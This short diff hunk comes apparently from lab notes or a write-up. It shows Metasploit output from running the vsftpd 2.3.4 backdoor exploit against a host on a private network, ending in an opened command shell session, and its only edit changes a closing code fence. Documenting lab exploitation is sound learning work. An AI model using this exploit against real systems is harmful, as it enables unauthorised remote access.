@@ -78,5 +78,5 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
 [*] Found shell.
 [*] Command shell session 1 opened (192.168.100.99:40451 -> 192.168.100.93:6200) at 2022-09-08 19:20:30 -0400
 
-
+´´´
 
